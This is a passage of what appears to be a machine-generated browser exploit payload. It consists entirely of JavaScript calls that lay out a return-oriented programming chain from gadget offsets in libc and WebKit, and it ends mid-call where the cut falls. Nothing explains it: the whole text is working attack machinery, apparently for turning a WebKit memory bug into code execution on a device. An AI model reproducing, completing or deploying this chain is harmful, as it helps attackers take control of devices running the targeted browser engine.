set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332120, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332192, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332264, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332336, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332408, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332480, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332552, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332624, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332696, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332768, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332840, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332912, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332984, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+333056, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+333192, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+333208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+333360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+333392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+333344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+333376, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+333512, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+333496, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965180, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967260, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+333640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+333656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+333808, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+333840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+333792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+333824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+333960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+333944, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965184, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+334040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+334112, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965188, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+334192, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965164, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+334304, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+222952, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
ropchain+397992, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+334448, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([66, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+334584, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+334672, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+334688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+334840, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+334872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+334824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+334856, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+334968, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+334952, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+335072, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+186040, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+335160, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+335328, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965156, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+335448, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+335504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+335568, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965156, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+335656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+335672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+335824, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+335856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+335808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+335840, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+335928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+335944, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+336040, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+336024, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+336120, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([512, 0]); 
set_gadget(libc_base+788575,); 
db([512, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+336272, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+336288, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+336256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+336456, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+336472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+336440, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+336576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+336624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+336608, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+336736, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+336728, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+336752, 
ropchain+336768, 
libc_base+811575, 
ropchain+336784, 
libc_base+811575, 
ropchain+340672, 
libc_base+759626, 
libc_base+793877, 
ropchain+336840, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+336920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+336976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+337072, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965156, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+337160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+337176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+337328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+337360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+337312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+337344, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+337520, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+337488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+337472, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+337592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+337608, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+337696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+337752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+337872, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+337904, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+337888, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+338056, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+338088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+338040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+338072, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+338160, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+338176, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+338272, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+338256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+338376, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+172888, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+338512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+338528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+338496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+338624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+338608, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+338704, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([66, 0]); 
set_gadget(libc_base+788575,); 
db([66, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+338856, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+338872, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+338840, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+269973, 
libc_base+793877, 
ropchain+339032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+339048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+339016, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+339152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+339200, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+339184, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+339312, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+339304, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+339328, 
ropchain+339952, 
libc_base+793877, 
ropchain+339384, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965156, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+339472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+339488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+339640, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+339672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+339624, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+339656, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+339744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+339760, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+339880, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+339864, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+339944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+340008, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965156, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+340096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+340112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+340264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+340296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+340248, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+340280, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+340392, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+340376, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+340480, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+340552, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965156, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+340616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+335512, 
libc_base+793877, 
ropchain+340728, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+340816, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+340832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+340984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+341016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+340968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+341000, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+341112, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+341096, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398008, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+341264, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+341352, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+341440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+341456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+341608, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+341640, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+341592, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+341624, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+341712, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+341728, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+341824, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+341808, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+341904, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
